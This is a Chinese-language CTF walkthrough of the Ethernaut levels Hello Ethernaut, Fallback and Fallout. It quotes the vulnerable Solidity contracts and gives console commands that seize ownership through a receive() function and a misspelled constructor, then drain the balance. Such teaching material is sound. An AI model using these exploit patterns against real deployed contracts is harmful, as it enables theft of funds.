# Hello Ethernaut
根据提示一步步来就好：
```js
await contract.info()
await contract.info1()
await contract.info2()
await contract.infonum()
await contract.info42()
await contract.theMethodname()
await contract.method7123949()
await contract.password()
await contract.authenticate("ethernaut0")
```

# Fallback
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```
目标是获取 owner 并且把 balance 变为 0。合约在部署时，部署者会成为 owner，并且会有 1000 ether 的初始贡献值。
- contribute() 函数允许用户贡献 小于 0.001 ether 的金额，且如果某个地址的贡献值超过当前 owner 的贡献值，该地址将成为新的 owner。
- receive() 函数允许合约接收以太币，并且如果满足条件（即 msg.value > 0 且 contributions[msg.sender] > 0），将当前调用者设为 owner。

要成为 owner，有两种方法：
- 使用 contribute() 函数，将 contributions[msg.sender] 增加到超过当前 owner 的贡献值。
- 使用 receive() 函数，只要有任何贡献，并发送非零金额的以太币即可成为 owner。

前者显然不太现实，因为需要的 ETH 太多。所以考虑利用 receive() 函数，为了利用 receive() 函数，需要先满足 `contributions[msg.sender] > 0` 条件。 所以 POC 如下：
```solidity
await contract.contribute({value: toWei("0.000001")})
await contract.sendTransaction({value: toWei("0.000001")})
await contract.owner() // 此时已经修改成功
await contract.withdraw()
```
看了其他同学的wp发现还有其他方法：
```solidity
await contract.contribute({value: '100'}) // 不带 toWei 直接单位就是 wei
await contract.send('100')                // 不带 toWei 直接单位就是 wei
```

# Fallout
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```
- 在 Solidity 0.6.0 版本之前，构造函数的名称必须与合约的名称相同。在这个合约中，构造函数名称写作 Fal1out，而不是 Fallout，所以它实际上并不是一个构造函数，而是一个普通的函数。
- 由于这个错误，owner 的初始所有者并没有被正确设置，任何人都可以调用这个 Fal1out 函数并成为 owner。
- 当然，题目之外，本题的合约还有一个问题：任何人都可以通过调用 `function sendAllocation(address payable allocator) public` 退还其他人的 allocation。

```solidity
await contract.Fal1out()
```
